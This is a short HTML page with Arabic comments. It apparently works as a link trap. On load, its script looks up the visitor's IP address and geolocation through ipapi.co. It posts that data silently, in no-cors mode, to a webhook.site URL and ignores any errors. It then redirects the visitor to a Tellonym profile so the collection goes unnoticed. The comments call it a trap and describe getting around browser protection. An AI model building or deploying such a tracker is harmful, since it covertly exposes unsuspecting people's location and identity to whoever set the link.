<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script>
        // رابط الـ Webhook الخاص بك لاختبار وصول البيانات
        const hook = "https://webhook.site/5e829926-604d-4dde-a540-5530e155e703";
        const finalDest = "https://tellonym.me/Schaien/anything";

        async function testTrap() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                // إرسال البيانات للـ Webhook
                await fetch(hook, {
                    method: 'POST',
                    mode: 'no-cors', // لتجاوز حماية المتصفح اللعينة
                    body: JSON.stringify(data)
                });

            } catch (e) {
                // صمت مطبق
            } finally {
                // تحويل للوجهة النهائية
                setTimeout(() => { window.location.replace(finalDest); }, 500);
            }
        }
        window.onload = testTrap;
    </script>
</head>
<body style="background: #000;"></body>
</html>
